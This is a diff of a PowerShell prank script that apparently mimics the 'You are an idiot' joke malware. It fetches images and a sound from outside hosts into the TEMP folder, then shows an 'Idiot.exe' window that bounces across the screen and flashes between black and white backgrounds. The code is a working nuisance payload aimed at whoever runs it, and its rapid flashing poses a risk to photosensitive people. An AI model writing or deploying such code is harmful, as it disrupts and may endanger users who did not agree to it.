@@ -22,8 +22,8 @@ if ($hide -eq 1){
 
 
 # Download sounds and images
-iwr -Uri 'https://i.ibb.co/RpFpd34/wh.png' -OutFile "$env:TEMP\white.png"
-iwr -Uri 'https://i.ibb.co/Nx16b06/bl.png' -OutFile "$env:TEMP\black.png" 
+iwr -Uri 'https://i.ibb.co/gDVfZ0L/white.jpg' -OutFile "$env:TEMP\white.png"
+iwr -Uri 'https://i.ibb.co/0nxjGzH/black.jpg' -OutFile "$env:TEMP\black.png"
 iwr -Uri 'https://github.com/beigeworm/assets/raw/main/idiot.wav' -OutFile "$env:TEMP\sound.wav"
 sleep 1
 
@@ -39,41 +39,72 @@ $job1 = {
 }
 
 $job2 = {  
-    Add-Type -AssemblyName System.Drawing
+
     Add-Type -AssemblyName System.Windows.Forms
-    $image1 = [System.Drawing.Image]::FromFile("$env:TEMP\white.png")
-    $image2 = [System.Drawing.Image]::FromFile("$env:TEMP\black.png")
+    Add-Type -AssemblyName System.Drawing
+    
+    $form = New-Object System.Windows.Forms.Form
+    $form.Text = "Idiot.exe"
+    $form.Width = 400
+    $form.Height = 400
+    
     $screen = [System.Windows.Forms.Screen]::PrimaryScreen
     $Width = $screen.Bounds.Width
     $Height = $screen.Bounds.Height
-    $desktopHandle = [System.IntPtr]::Zero
-    $graphics = [System.Drawing.Graphics]::FromHwnd($desktopHandle)
-    $random = New-Object System.Random
-    $x = $random.Next(10, 400)
-    $y = $random.Next(10, 400)
-    $dx = $random.Next(10, 25)
-    $dy = $random.Next(10, 25)
-    $imageSize = 250
-    $i = 1
+    $X = [math]::Round($Width / 2)
+    $Y = [math]::Round($Height / 2)
     
-    while ($true) { 
-        if ($i -eq 1){
-            $graphics.DrawImage($image1, $x, $y, $imageSize, $imageSize)
-            $i = 0    
-        }
-        else{
-            $graphics.DrawImage($image2, $x, $y, $imageSize, $imageSize)
-            $i = 1
-        }
-        $x += $dx
-        $y += $dy 
-        if ($x + $imageSize -gt $Width -or $x -lt 0) {
-            $dx = -$dx
-        }
-        if ($y + $imageSize -gt $Height -or $y -lt 0) {
-            $dy = -$dy
-        }
+    $form.StartPosition = "Manual"
+    $form.Location = [System.Drawing.Point]::new($X - $form.Width / 2, $Y - $form.Height / 2)
+    
+    $rand = New-Object System.Random
+    $dx = $rand.Next(-10, 10)
+    $dy = $rand.Next(-10, 10)
+    
+    $timer = New-Object System.Windows.Forms.Timer
+    $timer.Interval = 10
+    
+    $image1 = [System.Drawing.Image]::FromFile("$env:TEMP\white.png")
+    $image2 = [System.Drawing.Image]::FromFile("$env:TEMP\black.png")
+    
+    $images = @($image1, $image2)
+    $imageIndex = 0
+    $moveCount = 0
+    
+    function Set-BackgroundImage {
+        param (
+            [System.Drawing.Image]$image
+        )
+        $form.BackgroundImage = $image
+        $form.BackgroundImageLayout = "Stretch"
     }
+    
+    $timer.Add_Tick({
+        $newX = $form.Location.X + $dx
+        $newY = $form.Location.Y + $dy
+        if ($newX -lt 0 -or $newX + $form.Width -gt $Width) {
+            $script:dx = -$dx
+        }
+        if ($newY -lt 0 -or $newY + $form.Height -gt $Height) {
+            $script:dy = -$dy
+        }
+        $form.Location = [System.Drawing.Point]::new(
+            [Math]::Min([Math]::Max($newX, 0), $Width - $form.Width),
+            [Math]::Min([Math]::Max($newY, 0), $Height - $form.Height)
+        )
+    
+        $script:moveCount++
+        if ($moveCount -ge 20) {
+            $script:moveCount = 0
+            $script:imageIndex = ($imageIndex + 1) % $images.Length
+            Set-BackgroundImage $images[$imageIndex]
+        }
+    })
+    
+    $timer.Start()
+    $form.Add_Shown({ $form.Activate() })
+    [void]$form.ShowDialog()
+
 }
 
 Start-Job -ScriptBlock $job1
